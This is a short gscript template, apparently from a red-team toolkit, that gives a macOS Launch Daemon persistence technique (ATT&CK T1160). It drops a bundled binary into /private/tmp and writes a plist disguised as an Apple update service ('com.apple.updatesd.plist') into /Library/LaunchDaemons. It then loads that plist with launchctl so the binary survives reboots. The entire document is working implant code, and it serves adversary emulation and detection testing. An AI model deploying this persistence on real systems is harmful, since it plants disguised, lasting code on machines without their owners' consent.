// Example gscript template
// Title: Launch Daemon Persistence
// Author: ahhh
// Purpose: Drop a sample binary and a launch daemon plist and persist it using Launch Daemon
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1160

//priority:90
//timeout:150
//import:/private/tmp/example.macho
//import:/private/tmp/example_daemon.plist

var plist_name = "com.apple.updatesd.plist";

function BeforeDeploy() {
  LogInfo("starting execution of Launch Daemon Persistence");
  return true; 
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.macho");
  var name = "/private/tmp/daemon_example";
  WriteFile(name, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+name);
  
  // Persist the launch agent plist
  var example_daemon = Asset("example_daemon.plist");
  var location1 = "/System/Library/LaunchDaemons/" + plist_name;
  var location2 = "/Library/LaunchDaemons/" + plist_name;
  WriteFile(location2, example_daemon.fileData, 0755);
  ExecuteCommand("launchctl", ["load", "-w", location2]);
  console.log("Persisted binary using Launch Daemon, with the plist: "+location2);

  return true;
}

function AfterDeploy() {
  LogInfo("done, deployed binary with Launch Daemon persistence");
  return true;
}